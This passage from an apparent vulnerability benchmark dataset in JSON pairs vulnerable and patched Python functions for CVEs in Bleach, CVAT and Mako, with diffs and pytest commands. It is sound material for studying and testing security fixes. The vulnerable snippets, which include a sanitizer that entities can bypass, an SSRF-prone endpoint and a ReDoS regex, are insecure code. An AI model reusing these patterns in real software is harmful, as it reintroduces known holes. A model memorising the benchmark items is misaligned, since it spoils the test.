    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2020-10691:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/ansible\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2020-10691/bin/ansible-test integration ansible-galaxy-collection --python 3.8 --tags \"bad_tarball\" --allow-disabled && /workspace/PoC_env/CVE-2020-10691/bin/pytest test/units/galaxy/test_collection.py"
  },
  {
    "cve_id": "CVE-2018-7753",
    "cve_description": "An issue was discovered in Bleach 2.1.x before 2.1.3. Attributes that have URI values weren't properly sanitized if the values contained character entities. Using character entities, it was possible to construct a URI value with a scheme that was not allowed that would slide through unsanitized.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/mozilla/bleach",
    "patch_url": [
      "https://github.com/mozilla/bleach/commit/c5df5789ec3471a31311f42c2d19fc2cf21b35ef"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_67_1",
        "commit": "e7f83b8",
        "file_path": "bleach/sanitizer.py",
        "start_line": 441,
        "end_line": 489,
        "snippet": "    def sanitize_characters(self, token):\n        \"\"\"Handles Characters tokens\n\n        Our overridden tokenizer doesn't do anything with entities. However,\n        that means that the serializer will convert all ``&`` in Characters\n        tokens to ``&amp;``.\n\n        Since we don't want that, we extract entities here and convert them to\n        Entity tokens so the serializer will let them be.\n\n        :arg token: the Characters token to work on\n\n        :returns: a list of tokens\n\n        \"\"\"\n        data = token.get('data', '')\n\n        if not data:\n            return token\n\n        data = INVISIBLE_CHARACTERS_RE.sub(INVISIBLE_REPLACEMENT_CHAR, data)\n        token['data'] = data\n\n        # If there isn't a & in the data, we can return now\n        if '&' not in data:\n            return token\n\n        new_tokens = []\n\n        # For each possible entity that starts with a \"&\", we try to extract an\n        # actual entity and re-tokenize accordingly\n        for part in next_possible_entity(data):\n            if not part:\n                continue\n\n            if part.startswith('&'):\n                entity = match_entity(part)\n                if entity is not None:\n                    new_tokens.append({'type': 'Entity', 'name': entity})\n                    # Length of the entity plus 2--one for & at the beginning\n                    # and and one for ; at the end\n                    part = part[len(entity) + 2:]\n                    if part:\n                        new_tokens.append({'type': 'Characters', 'data': part})\n                    continue\n\n            new_tokens.append({'type': 'Characters', 'data': part})\n\n        return new_tokens"
      },
      {
        "id": "vul_py_67_2",
        "commit": "e7f83b8",
        "file_path": "bleach/sanitizer.py",
        "start_line": 491,
        "end_line": 556,
        "snippet": "    def allow_token(self, token):\n        \"\"\"Handles the case where we're allowing the tag\"\"\"\n        if 'data' in token:\n            # Loop through all the attributes and drop the ones that are not\n            # allowed, are unsafe or break other rules. Additionally, fix\n            # attribute values that need fixing.\n            #\n            # At the end of this loop, we have the final set of attributes\n            # we're keeping.\n            attrs = {}\n            for namespaced_name, val in token['data'].items():\n                namespace, name = namespaced_name\n\n                # Drop attributes that are not explicitly allowed\n                #\n                # NOTE(willkg): We pass in the attribute name--not a namespaced\n                # name.\n                if not self.attr_filter(token['name'], name, val):\n                    continue\n\n                # Look at attributes that have uri values\n                if namespaced_name in self.attr_val_is_uri:\n                    val_unescaped = re.sub(\n                        \"[`\\000-\\040\\177-\\240\\s]+\",\n                        '',\n                        unescape(val)).lower()\n\n                    # Remove replacement characters from unescaped characters.\n                    val_unescaped = val_unescaped.replace(\"\\ufffd\", \"\")\n\n                    # Drop attributes with uri values that have protocols that\n                    # aren't allowed\n                    if (re.match(r'^[a-z0-9][-+.a-z0-9]*:', val_unescaped) and\n                            (val_unescaped.split(':')[0] not in self.allowed_protocols)):\n                        continue\n\n                # Drop values in svg attrs with non-local IRIs\n                if namespaced_name in self.svg_attr_val_allows_ref:\n                    new_val = re.sub(r'url\\s*\\(\\s*[^#\\s][^)]+?\\)',\n                                     ' ',\n                                     unescape(val))\n                    new_val = new_val.strip()\n                    if not new_val:\n                        continue\n\n                    else:\n                        # Replace the val with the unescaped version because\n                        # it's a iri\n                        val = new_val\n\n                # Drop href and xlink:href attr for svg elements with non-local IRIs\n                if (None, token['name']) in self.svg_allow_local_href:\n                    if namespaced_name in [(None, 'href'), (namespaces['xlink'], 'href')]:\n                        if re.search(r'^\\s*[^#\\s]', val):\n                            continue\n\n                # If it's a style attribute, sanitize it\n                if namespaced_name == (None, u'style'):\n                    val = self.sanitize_css(val)\n\n                # At this point, we want to keep the attribute, so add it in\n                attrs[namespaced_name] = val\n\n            token['data'] = alphabetize_attributes(attrs)\n\n        return token"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_67_1",
        "commit": "c5df5789ec3471a31311f42c2d19fc2cf21b35ef",
        "file_path": "bleach/sanitizer.py",
        "start_line": 493,
        "end_line": 541,
        "snippet": "    def sanitize_characters(self, token):\n        \"\"\"Handles Characters tokens\n\n        Our overridden tokenizer doesn't do anything with entities. However,\n        that means that the serializer will convert all ``&`` in Characters\n        tokens to ``&amp;``.\n\n        Since we don't want that, we extract entities here and convert them to\n        Entity tokens so the serializer will let them be.\n\n        :arg token: the Characters token to work on\n\n        :returns: a list of tokens\n\n        \"\"\"\n        data = token.get('data', '')\n\n        if not data:\n            return token\n\n        data = INVISIBLE_CHARACTERS_RE.sub(INVISIBLE_REPLACEMENT_CHAR, data)\n        token['data'] = data\n\n        # If there isn't a & in the data, we can return now\n        if '&' not in data:\n            return token\n\n        new_tokens = []\n\n        # For each possible entity that starts with a \"&\", we try to extract an\n        # actual entity and re-tokenize accordingly\n        for part in next_possible_entity(data):\n            if not part:\n                continue\n\n            if part.startswith('&'):\n                entity = match_entity(part)\n                if entity is not None:\n                    new_tokens.append({'type': 'Entity', 'name': entity})\n                    # Length of the entity plus 2--one for & at the beginning\n                    # and and one for ; at the end\n                    remainder = part[len(entity) + 2:]\n                    if remainder:\n                        new_tokens.append({'type': 'Characters', 'data': remainder})\n                    continue\n\n            new_tokens.append({'type': 'Characters', 'data': part})\n\n        return new_tokens"
      },
      {
        "id": "fix_py_67_2",
        "commit": "c5df5789ec3471a31311f42c2d19fc2cf21b35ef",
        "file_path": "bleach/sanitizer.py",
        "start_line": 597,
        "end_line": 654,
        "snippet": "    def allow_token(self, token):\n        \"\"\"Handles the case where we're allowing the tag\"\"\"\n        if 'data' in token:\n            # Loop through all the attributes and drop the ones that are not\n            # allowed, are unsafe or break other rules. Additionally, fix\n            # attribute values that need fixing.\n            #\n            # At the end of this loop, we have the final set of attributes\n            # we're keeping.\n            attrs = {}\n            for namespaced_name, val in token['data'].items():\n                namespace, name = namespaced_name\n\n                # Drop attributes that are not explicitly allowed\n                #\n                # NOTE(willkg): We pass in the attribute name--not a namespaced\n                # name.\n                if not self.attr_filter(token['name'], name, val):\n                    continue\n\n                # Drop attributes with uri values that use a disallowed protocol\n                # Sanitize attributes with uri values\n                if namespaced_name in self.attr_val_is_uri:\n                    new_value = self.sanitize_uri_value(val, self.allowed_protocols)\n                    if new_value is None:\n                        continue\n                    val = new_value\n\n                # Drop values in svg attrs with non-local IRIs\n                if namespaced_name in self.svg_attr_val_allows_ref:\n                    new_val = re.sub(r'url\\s*\\(\\s*[^#\\s][^)]+?\\)',\n                                     ' ',\n                                     unescape(val))\n                    new_val = new_val.strip()\n                    if not new_val:\n                        continue\n\n                    else:\n                        # Replace the val with the unescaped version because\n                        # it's a iri\n                        val = new_val\n\n                # Drop href and xlink:href attr for svg elements with non-local IRIs\n                if (None, token['name']) in self.svg_allow_local_href:\n                    if namespaced_name in [(None, 'href'), (namespaces['xlink'], 'href')]:\n                        if re.search(r'^\\s*[^#\\s]', val):\n                            continue\n\n                # If it's a style attribute, sanitize it\n                if namespaced_name == (None, u'style'):\n                    val = self.sanitize_css(val)\n\n                # At this point, we want to keep the attribute, so add it in\n                attrs[namespaced_name] = val\n\n            token['data'] = alphabetize_attributes(attrs)\n\n        return token"
      },
      {
        "id": "fix_py_67_3",
        "commit": "c5df5789ec3471a31311f42c2d19fc2cf21b35ef",
        "file_path": "bleach/sanitizer.py",
        "start_line": 86,
        "end_line": 101,
        "snippet": "def convert_entity(value):\n    \"\"\"Convert an entity (minus the & and ; part) into what it represents\n\n    This handles numeric, hex, and text entities.\n\n    :arg value: the string (minus the ``&`` and ``;`` part) to convert\n\n    :returns: unicode character\n\n    \"\"\"\n    if value[0] == '#':\n        if value[1] in ('x', 'X'):\n            return six.unichr(int(value[2:], 16))\n        return six.unichr(int(value[1:], 10))\n\n    return ENTITIES[value]"
      },
      {
        "id": "fix_py_67_4",
        "commit": "c5df5789ec3471a31311f42c2d19fc2cf21b35ef",
        "file_path": "bleach/sanitizer.py",
        "start_line": 104,
        "end_line": 131,
        "snippet": "def convert_entities(text):\n    \"\"\"Converts all found entities in the text\n\n    :arg text: the text to convert entities in\n\n    :returns: unicode text with converted entities\n\n    \"\"\"\n    if '&' not in text:\n        return text\n\n    new_text = []\n    for part in next_possible_entity(text):\n        if not part:\n            continue\n\n        if part.startswith('&'):\n            entity = match_entity(part)\n            if entity is not None:\n                new_text.append(convert_entity(entity))\n                remainder = part[len(entity) + 2:]\n                if part:\n                    new_text.append(remainder)\n                continue\n\n        new_text.append(part)\n\n    return u''.join(new_text)"
      },
      {
        "id": "fix_py_67_5",
        "commit": "c5df5789ec3471a31311f42c2d19fc2cf21b35ef",
        "file_path": "bleach/sanitizer.py",
        "start_line": 543,
        "end_line": 596,
        "snippet": "    def sanitize_uri_value(self, value, allowed_protocols):\n        \"\"\"Checks a uri value to see if it's allowed\n\n        :arg value: the uri value to sanitize\n        :arg allowed_protocols: list of allowed protocols\n\n        :returns: allowed value or None\n\n        \"\"\"\n        # NOTE(willkg): This transforms the value into one that's easier to\n        # match and verify, but shouldn't get returned since it's vastly\n        # different than the original value.\n\n        # Convert all character entities in the value\n        new_value = convert_entities(value)\n\n        # Nix backtick, space characters, and control characters\n        new_value = re.sub(\n            \"[`\\000-\\040\\177-\\240\\s]+\",\n            '',\n            new_value\n        )\n\n        # Remove REPLACEMENT characters\n        new_value = new_value.replace('\\ufffd', '')\n\n        # Lowercase it--this breaks the value, but makes it easier to match\n        # against\n        new_value = new_value.lower()\n\n        # Drop attributes with uri values that have protocols that aren't\n        # allowed\n        parsed = urlparse(new_value)\n        if parsed.scheme:\n            # If urlparse found a scheme, check that\n            if parsed.scheme in allowed_protocols:\n                return value\n\n        else:\n            # Allow uris that are just an anchor\n            if new_value.startswith('#'):\n                return value\n\n            # Handle protocols that urlparse doesn't recognize like \"myprotocol\"\n            if ':' in new_value and new_value.split(':')[0] in allowed_protocols:\n                return value\n\n            # If there's no protocol/scheme specified, then assume it's \"http\"\n            # and see if that's allowed\n            if 'http' in allowed_protocols:\n                return value\n\n        return None\n"
      }
    ],
    "vul_patch": "--- a/bleach/sanitizer.py\n+++ b/bleach/sanitizer.py\n@@ -39,9 +39,9 @@\n                     new_tokens.append({'type': 'Entity', 'name': entity})\n                     # Length of the entity plus 2--one for & at the beginning\n                     # and and one for ; at the end\n-                    part = part[len(entity) + 2:]\n-                    if part:\n-                        new_tokens.append({'type': 'Characters', 'data': part})\n+                    remainder = part[len(entity) + 2:]\n+                    if remainder:\n+                        new_tokens.append({'type': 'Characters', 'data': remainder})\n                     continue\n \n             new_tokens.append({'type': 'Characters', 'data': part})\n\n--- a/bleach/sanitizer.py\n+++ b/bleach/sanitizer.py\n@@ -18,21 +18,13 @@\n                 if not self.attr_filter(token['name'], name, val):\n                     continue\n \n-                # Look at attributes that have uri values\n+                # Drop attributes with uri values that use a disallowed protocol\n+                # Sanitize attributes with uri values\n                 if namespaced_name in self.attr_val_is_uri:\n-                    val_unescaped = re.sub(\n-                        \"[`\\000-\\040\\177-\\240\\s]+\",\n-                        '',\n-                        unescape(val)).lower()\n-\n-                    # Remove replacement characters from unescaped characters.\n-                    val_unescaped = val_unescaped.replace(\"\\ufffd\", \"\")\n-\n-                    # Drop attributes with uri values that have protocols that\n-                    # aren't allowed\n-                    if (re.match(r'^[a-z0-9][-+.a-z0-9]*:', val_unescaped) and\n-                            (val_unescaped.split(':')[0] not in self.allowed_protocols)):\n+                    new_value = self.sanitize_uri_value(val, self.allowed_protocols)\n+                    if new_value is None:\n                         continue\n+                    val = new_value\n \n                 # Drop values in svg attrs with non-local IRIs\n                 if namespaced_name in self.svg_attr_val_allows_ref:\n\n--- /dev/null\n+++ b/bleach/sanitizer.py\n@@ -0,0 +1,16 @@\n+def convert_entity(value):\n+    \"\"\"Convert an entity (minus the & and ; part) into what it represents\n+\n+    This handles numeric, hex, and text entities.\n+\n+    :arg value: the string (minus the ``&`` and ``;`` part) to convert\n+\n+    :returns: unicode character\n+\n+    \"\"\"\n+    if value[0] == '#':\n+        if value[1] in ('x', 'X'):\n+            return six.unichr(int(value[2:], 16))\n+        return six.unichr(int(value[1:], 10))\n+\n+    return ENTITIES[value]\n\n--- /dev/null\n+++ b/bleach/sanitizer.py\n@@ -0,0 +1,28 @@\n+def convert_entities(text):\n+    \"\"\"Converts all found entities in the text\n+\n+    :arg text: the text to convert entities in\n+\n+    :returns: unicode text with converted entities\n+\n+    \"\"\"\n+    if '&' not in text:\n+        return text\n+\n+    new_text = []\n+    for part in next_possible_entity(text):\n+        if not part:\n+            continue\n+\n+        if part.startswith('&'):\n+            entity = match_entity(part)\n+            if entity is not None:\n+                new_text.append(convert_entity(entity))\n+                remainder = part[len(entity) + 2:]\n+                if part:\n+                    new_text.append(remainder)\n+                continue\n+\n+        new_text.append(part)\n+\n+    return u''.join(new_text)\n\n--- /dev/null\n+++ b/bleach/sanitizer.py\n@@ -0,0 +1,53 @@\n+    def sanitize_uri_value(self, value, allowed_protocols):\n+        \"\"\"Checks a uri value to see if it's allowed\n+\n+        :arg value: the uri value to sanitize\n+        :arg allowed_protocols: list of allowed protocols\n+\n+        :returns: allowed value or None\n+\n+        \"\"\"\n+        # NOTE(willkg): This transforms the value into one that's easier to\n+        # match and verify, but shouldn't get returned since it's vastly\n+        # different than the original value.\n+\n+        # Convert all character entities in the value\n+        new_value = convert_entities(value)\n+\n+        # Nix backtick, space characters, and control characters\n+        new_value = re.sub(\n+            \"[`\\000-\\040\\177-\\240\\s]+\",\n+            '',\n+            new_value\n+        )\n+\n+        # Remove REPLACEMENT characters\n+        new_value = new_value.replace('\\ufffd', '')\n+\n+        # Lowercase it--this breaks the value, but makes it easier to match\n+        # against\n+        new_value = new_value.lower()\n+\n+        # Drop attributes with uri values that have protocols that aren't\n+        # allowed\n+        parsed = urlparse(new_value)\n+        if parsed.scheme:\n+            # If urlparse found a scheme, check that\n+            if parsed.scheme in allowed_protocols:\n+                return value\n+\n+        else:\n+            # Allow uris that are just an anchor\n+            if new_value.startswith('#'):\n+                return value\n+\n+            # Handle protocols that urlparse doesn't recognize like \"myprotocol\"\n+            if ':' in new_value and new_value.split(':')[0] in allowed_protocols:\n+                return value\n+\n+            # If there's no protocol/scheme specified, then assume it's \"http\"\n+            # and see if that's allowed\n+            if 'http' in allowed_protocols:\n+                return value\n+\n+        return None\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2018-7753:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/bleach\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2018-7753/bin/python -m pytest tests/test_clean.py::test_uri_value_allowed_protocols tests/test_clean.py::test_character_entities_handling -v\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2018-7753:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/bleach\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2018-7753/bin/python -m pytest tests/test_clean.py -v\n"
  },
  {
    "cve_id": "CVE-2024-37164",
    "cve_description": "Computer Vision Annotation Tool (CVAT) is an interactive video and image annotation tool for computer vision. CVAT allows users to supply custom endpoint URLs for cloud storages based on Amazon S3 and Azure Blob Storage. Starting in version 2.1.0 and prior to version 2.14.3, an attacker with a CVAT account can exploit this feature by specifying URLs whose host part is an intranet IP address or an internal domain name. By doing this, the attacker may be able to probe the network that the CVAT backend runs in for HTTP(S) servers. In addition, if there is a web server on this network that is sufficiently API-compatible with an Amazon S3 or Azure Blob Storage endpoint, and either allows anonymous access, or allows authentication with credentials that are known by the attacker, then the attacker may be able to create a cloud storage linked to this server. They may then be able to list files on the server; extract files from the server, if these files are of a type that CVAT supports reading from cloud storage (media data (such as images/videos/archives), importable annotations or datasets, task/project backups); and/or overwrite files on this server with exported annotations/datasets/backups. The exact capabilities of the attacker will depend on how the internal server is configured. Users should upgrade to CVAT 2.14.3 to receive a patch. In this release, the existing SSRF mitigation measures are applied to requests to cloud providers, with access to intranet IP addresses prohibited by default. Some workarounds are also available. One may use network security solutions such as virtual networks or firewalls to prohibit network access from the CVAT backend to unrelated servers on your internal network and/or require authentication for access to internal servers.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/cvat-ai/cvat",
    "patch_url": [
      "https://github.com/cvat-ai/cvat/commit/f2346934c80bd91740f55c2788ef7d535a291d4c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_135_1",
        "commit": "cf2f329",
        "file_path": "cvat/apps/engine/cloud_provider.py",
        "start_line": 411,
        "end_line": 455,
        "snippet": "    def __init__(self,\n                bucket: str,\n                region: Optional[str] = None,\n                access_key_id: Optional[str] = None,\n                secret_key: Optional[str] = None,\n                session_token: Optional[str] = None,\n                endpoint_url: Optional[str] = None,\n                prefix: Optional[str] = None,\n    ):\n        super().__init__(prefix=prefix)\n        if (\n            sum(\n                1\n                for credential in (access_key_id, secret_key, session_token)\n                if credential\n            )\n            == 1\n        ):\n            raise Exception(\"Insufficient data for authentication\")\n\n        kwargs = dict()\n        for key, arg_v in zip(\n            (\n                \"aws_access_key_id\",\n                \"aws_secret_access_key\",\n                \"aws_session_token\",\n                \"region_name\",\n            ),\n            (access_key_id, secret_key, session_token, region),\n        ):\n            if arg_v:\n                kwargs[key] = arg_v\n\n        session = boto3.Session(**kwargs)\n        self._s3 = session.resource(\"s3\", endpoint_url=endpoint_url)\n\n        # anonymous access\n        if not any([access_key_id, secret_key, session_token]):\n            self._s3.meta.client.meta.events.register(\n                \"choose-signer.s3.*\", disable_signing\n            )\n\n        self._client = self._s3.meta.client\n        self._bucket = self._s3.Bucket(bucket)\n        self.region = region"
      },
      {
        "id": "vul_py_135_2",
        "commit": "cf2f329",
        "file_path": "cvat/apps/engine/cloud_provider.py",
        "start_line": 636,
        "end_line": 652,
        "snippet": "    def __init__(\n        self,\n        container: str,\n        account_name: Optional[str] = None,\n        sas_token: Optional[str] = None,\n        connection_string: Optional[str] = None,\n        prefix: Optional[str] = None,\n    ):\n        super().__init__(prefix=prefix)\n        self._account_name = account_name\n        if connection_string:\n            self._blob_service_client = BlobServiceClient.from_connection_string(connection_string)\n        elif sas_token:\n            self._blob_service_client = BlobServiceClient(account_url=self.account_url, credential=sas_token)\n        else:\n            self._blob_service_client = BlobServiceClient(account_url=self.account_url)\n        self._client = self._blob_service_client.get_container_client(container)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_135_1",
        "commit": "f234693",
        "file_path": "cvat/apps/engine/cloud_provider.py",
        "start_line": 413,
        "end_line": 459,
        "snippet": "    def __init__(self,\n                bucket: str,\n                region: Optional[str] = None,\n                access_key_id: Optional[str] = None,\n                secret_key: Optional[str] = None,\n                session_token: Optional[str] = None,\n                endpoint_url: Optional[str] = None,\n                prefix: Optional[str] = None,\n    ):\n        super().__init__(prefix=prefix)\n        if (\n            sum(\n                1\n                for credential in (access_key_id, secret_key, session_token)\n                if credential\n            )\n            == 1\n        ):\n            raise Exception(\"Insufficient data for authentication\")\n\n        kwargs = dict()\n        for key, arg_v in zip(\n            (\n                \"aws_access_key_id\",\n                \"aws_secret_access_key\",\n                \"aws_session_token\",\n                \"region_name\",\n            ),\n            (access_key_id, secret_key, session_token, region),\n        ):\n            if arg_v:\n                kwargs[key] = arg_v\n\n        session = boto3.Session(**kwargs)\n        self._s3 = session.resource(\"s3\", endpoint_url=endpoint_url,\n            config=Config(proxies=PROXIES_FOR_UNTRUSTED_URLS or {}),\n        )\n\n        # anonymous access\n        if not any([access_key_id, secret_key, session_token]):\n            self._s3.meta.client.meta.events.register(\n                \"choose-signer.s3.*\", disable_signing\n            )\n\n        self._client = self._s3.meta.client\n        self._bucket = self._s3.Bucket(bucket)\n        self.region = region"
      },
      {
        "id": "fix_py_135_2",
        "commit": "f234693",
        "file_path": "cvat/apps/engine/cloud_provider.py",
        "start_line": 640,
        "end_line": 659,
        "snippet": "    def __init__(\n        self,\n        container: str,\n        account_name: Optional[str] = None,\n        sas_token: Optional[str] = None,\n        connection_string: Optional[str] = None,\n        prefix: Optional[str] = None,\n    ):\n        super().__init__(prefix=prefix)\n        self._account_name = account_name\n        if connection_string:\n            self._blob_service_client = BlobServiceClient.from_connection_string(\n                connection_string, proxies=PROXIES_FOR_UNTRUSTED_URLS)\n        elif sas_token:\n            self._blob_service_client = BlobServiceClient(\n                account_url=self.account_url, credential=sas_token, proxies=PROXIES_FOR_UNTRUSTED_URLS)\n        else:\n            self._blob_service_client = BlobServiceClient(\n                account_url=self.account_url, proxies=PROXIES_FOR_UNTRUSTED_URLS)\n        self._client = self._blob_service_client.get_container_client(container)"
      }
    ],
    "vul_patch": "--- a/cvat/apps/engine/cloud_provider.py\n+++ b/cvat/apps/engine/cloud_provider.py\n@@ -32,7 +32,9 @@\n                 kwargs[key] = arg_v\n \n         session = boto3.Session(**kwargs)\n-        self._s3 = session.resource(\"s3\", endpoint_url=endpoint_url)\n+        self._s3 = session.resource(\"s3\", endpoint_url=endpoint_url,\n+            config=Config(proxies=PROXIES_FOR_UNTRUSTED_URLS or {}),\n+        )\n \n         # anonymous access\n         if not any([access_key_id, secret_key, session_token]):\n\n--- a/cvat/apps/engine/cloud_provider.py\n+++ b/cvat/apps/engine/cloud_provider.py\n@@ -9,9 +9,12 @@\n         super().__init__(prefix=prefix)\n         self._account_name = account_name\n         if connection_string:\n-            self._blob_service_client = BlobServiceClient.from_connection_string(connection_string)\n+            self._blob_service_client = BlobServiceClient.from_connection_string(\n+                connection_string, proxies=PROXIES_FOR_UNTRUSTED_URLS)\n         elif sas_token:\n-            self._blob_service_client = BlobServiceClient(account_url=self.account_url, credential=sas_token)\n+            self._blob_service_client = BlobServiceClient(\n+                account_url=self.account_url, credential=sas_token, proxies=PROXIES_FOR_UNTRUSTED_URLS)\n         else:\n-            self._blob_service_client = BlobServiceClient(account_url=self.account_url)\n+            self._blob_service_client = BlobServiceClient(\n+                account_url=self.account_url, proxies=PROXIES_FOR_UNTRUSTED_URLS)\n         self._client = self._blob_service_client.get_container_client(container)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-40023",
    "cve_description": "Sqlalchemy mako before 1.2.2 is vulnerable to Regular expression Denial of Service when using the Lexer class to parse. This also affects babelplugin and linguaplugin.",
    "cwe_info": {
      "CWE-1333": {
        "name": "Inefficient Regular Expression Complexity",
        "description": "The product uses a regular expression with an inefficient, possibly exponential worst-case computational complexity that consumes excessive CPU cycles."
      }
    },
    "repo": "https://github.com/sqlalchemy/mako",
    "patch_url": [
      "https://github.com/sqlalchemy/mako/commit/925760291d6efec64fda6e9dd1fd9cfbd5be068c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_434_1",
        "commit": "7c5b28a",
        "file_path": "mako/lexer.py",
        "start_line": "274",
        "end_line": "318",
        "snippet": "    def match_tag_start(self):\n        match = self.match(\n            r\"\"\"\n            \\<%     # opening tag\n\n            ([\\w\\.\\:]+)   # keyword\n\n            ((?:\\s+\\w+|\\s*=\\s*|\".*?\"|'.*?')*)  # attrname, = \\\n                                               #        sign, string expression\n\n            \\s*     # more whitespace\n\n            (/)?>   # closing\n\n            \"\"\",\n            re.I | re.S | re.X,\n        )\n\n        if not match:\n            return False\n\n        keyword, attr, isend = match.groups()\n        self.keyword = keyword\n        attributes = {}\n        if attr:\n            for att in re.findall(\n                r\"\\s*(\\w+)\\s*=\\s*(?:'([^']*)'|\\\"([^\\\"]*)\\\")\", attr\n            ):\n                key, val1, val2 = att\n                text = val1 or val2\n                text = text.replace(\"\\r\\n\", \"\\n\")\n                attributes[key] = text\n        self.append_node(parsetree.Tag, keyword, attributes)\n        if isend:\n            self.tag.pop()\n        elif keyword == \"text\":\n            match = self.match(r\"(.*?)(?=\\</%text>)\", re.S)\n            if not match:\n                raise exceptions.SyntaxException(\n                    \"Unclosed tag: <%%%s>\" % self.tag[-1].keyword,\n                    **self.exception_kwargs,\n                )\n            self.append_node(parsetree.Text, match.group(1))\n            return self.match_tag_end()\n        return True"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_434_1",
        "commit": "925760291d6efec64fda6e9dd1fd9cfbd5be068c",
        "file_path": "mako/lexer.py",
        "start_line": "274",
        "end_line": "322",
        "snippet": "    def match_tag_start(self):\n        reg = r\"\"\"\n            \\<%     # opening tag\n\n            ([\\w\\.\\:]+)   # keyword\n\n            ((?:\\s+\\w+|\\s*=\\s*|\"[^\"]*?\"|'[^']*?'|\\s*,\\s*)*)  # attrname, = \\\n                                               #        sign, string expression\n                                               # comma is for backwards compat\n                                               # identified in #366\n\n            \\s*     # more whitespace\n\n            (/)?>   # closing\n\n        \"\"\"\n\n        match = self.match(\n            reg,\n            re.I | re.S | re.X,\n        )\n\n        if not match:\n            return False\n\n        keyword, attr, isend = match.groups()\n        self.keyword = keyword\n        attributes = {}\n        if attr:\n            for att in re.findall(\n                r\"\\s*(\\w+)\\s*=\\s*(?:'([^']*)'|\\\"([^\\\"]*)\\\")\", attr\n            ):\n                key, val1, val2 = att\n                text = val1 or val2\n                text = text.replace(\"\\r\\n\", \"\\n\")\n                attributes[key] = text\n        self.append_node(parsetree.Tag, keyword, attributes)\n        if isend:\n            self.tag.pop()\n        elif keyword == \"text\":\n            match = self.match(r\"(.*?)(?=\\</%text>)\", re.S)\n            if not match:\n                raise exceptions.SyntaxException(\n                    \"Unclosed tag: <%%%s>\" % self.tag[-1].keyword,\n                    **self.exception_kwargs,\n                )\n            self.append_node(parsetree.Text, match.group(1))\n            return self.match_tag_end()\n        return True"
      }
    ],
    "vul_patch": "--- a/mako/lexer.py\n+++ b/mako/lexer.py\n@@ -1,18 +1,22 @@\n     def match_tag_start(self):\n-        match = self.match(\n-            r\"\"\"\n+        reg = r\"\"\"\n             \\<%     # opening tag\n \n             ([\\w\\.\\:]+)   # keyword\n \n-            ((?:\\s+\\w+|\\s*=\\s*|\".*?\"|'.*?')*)  # attrname, = \\\n+            ((?:\\s+\\w+|\\s*=\\s*|\"[^\"]*?\"|'[^']*?'|\\s*,\\s*)*)  # attrname, = \\\n                                                #        sign, string expression\n+                                               # comma is for backwards compat\n+                                               # identified in #366\n \n             \\s*     # more whitespace\n \n             (/)?>   # closing\n \n-            \"\"\",\n+        \"\"\"\n+\n+        match = self.match(\n+            reg,\n             re.I | re.S | re.X,\n         )\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  }
]